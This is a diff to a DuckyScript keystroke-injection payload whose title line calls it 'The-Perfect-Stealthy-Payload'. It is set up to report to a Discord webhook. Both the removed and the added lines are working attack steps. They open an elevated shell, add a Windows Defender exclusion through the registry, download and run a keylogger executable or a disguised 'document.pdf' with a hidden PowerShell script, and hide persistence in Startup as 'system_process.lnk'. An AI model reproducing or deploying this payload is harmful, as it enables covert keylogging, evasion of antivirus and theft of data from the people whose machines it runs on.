@@ -1,6 +1,3 @@
-REM Title: The-Perfect-Stealthy-Payload
-REM Author: zb0r
-
 DEFINE #URL https://discord.com/api/webhooks/
 DEFINE #LINES 300
 
@@ -49,45 +46,25 @@ END_EXTENSION
 DELAY 100
 GUI r
 DELAY 500
-STRING powershell
+STRING cmd.exe
 DELAY 500
 CTRL SHIFT ENTER
-DELAY 1000
+DELAY 500
 LEFTARROW
-DELAY 1000
-ENTER
-DELAY 1500
-REM Create Cache folder in Windows/temp
-STRINGLN mkdir "$env:windir\temp\Cache"
 DELAY 500
-
-REM Add exclusion in Defender for Cache folder via registry manipulation
-STRINGLN Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
+ENTER
 DELAY 1000
 
-REM Download payload from VPS Invoke-WebRequest
-STRINGLN Invoke-WebRequest -Uri "https://github.com/wishtag/keylogger/raw/refs/heads/main/dist/main.exe" -OutFile "$env:windir\temp\Cache\main.exe"
-DELAY 1500
-
-STRINGLN New-Item -Path "$env:USERPROFILE\Source\src" -ItemType File -Force | Out-Null
+REM Create src file which stores URL and LINES
+STRINGLN mkdir "%USERPROFILE%\Source" 2>nul & (echo #URL && echo #LINES) > "%USERPROFILE%\Source\src"
 DELAY 500
 
-STRINGLN Set-Content -Path "$env:USERPROFILE\Source\src" -Value "#URL`n#LINES"
+REM Download the .ps1 file
+STRINGLN powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/wishtag/disguised-batch/refs/heads/main/document.pdf -OutFile document.pdf"
 DELAY 500
 
-REM Execute the downloaded payload
-STRINGLN Start-Process "$env:windir\temp\Cache\main.exe"
+REM Run .ps1 file which does most of the heavy lifting with downloading and stuff
+STRINGLN powershell -WindowStyle Hidden -File "C:\path\to\script.ps1"
 DELAY 500
 
-REM Add main.exe to startup
-STRINGLN $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\system_process.lnk");$s.TargetPath="$env:windir\temp\Cache\main.exe";$s.Save()
-DELAY 500
-
-STRING EXIT
-DELAY 300
-ENTER
-
-DELAY 100
-ALT SPACE
-DELAY 100
-N
+STRINGLN exit
